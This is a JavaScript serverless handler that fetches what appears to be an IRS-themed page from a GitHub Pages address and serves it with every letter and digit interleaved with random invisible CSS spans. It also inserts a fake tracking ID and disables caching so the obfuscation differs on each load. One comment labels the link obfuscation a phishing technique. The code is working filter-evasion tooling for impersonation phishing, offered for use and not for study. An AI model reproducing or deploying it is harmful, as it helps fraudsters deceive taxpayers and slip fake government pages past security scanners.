import fetch from "node-fetch";

// Function to generate random obfuscation patterns using inline CSS
function randomObfuscationSpan() {
    const randomString = Math.random().toString(36).substring(2, 6); // Generate a small random string
    return `<span style='content:"${randomString}";'></span>`;
}

// Function to obfuscate text while keeping structure intact
function obfuscateText(text) {
    return text.replace(/([a-zA-Z0-9])/g, (match) => {
        return match + randomObfuscationSpan();
    });
}

// Function to obfuscate links (phishing technique)
function obfuscateLink(link) {
    let visibleLink = link.replace(/(https?:\/\/)/, ""); // Remove protocol for realism
    return visibleLink.replace(/([a-zA-Z0-9])/g, (match) => {
        return match + randomObfuscationSpan();
    });
}

// Function to generate a fake randomized tracking ID
function generateFakeTrackingID() {
    let id = "";
    for (let i = 0; i < 5; i++) {
        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
    }
    return id.slice(0, -1); // Remove last "-"
}

// API Handler to serve obfuscated HTML
export default async function handler(req, res) {
    try {
        // Fetch the original HTML (Replace with actual source URL)
        const response = await fetch("https://mightyflavor.github.io/obfuscationnn/IRS_ob"); // Replace with actual URL
        let html = await response.text();

        // Preserve HTML structure and obfuscate only visible text
        let modifiedHTML = html.replace(/>([^<>]+)</g, (match, text) => {
            if (text.trim() !== "") {
                return ">" + obfuscateText(text) + "<"; // Obfuscate text while keeping tags intact
            }
            return match; // Leave empty tags unchanged
        });

       

        // Inject a fake tracking ID
        let fakeTrackingID = generateFakeTrackingID();
        modifiedHTML = modifiedHTML.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);

        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error fetching/modifying HTML:", error);
        return res.status(500).send("Error fetching or modifying HTML.");
    }
}
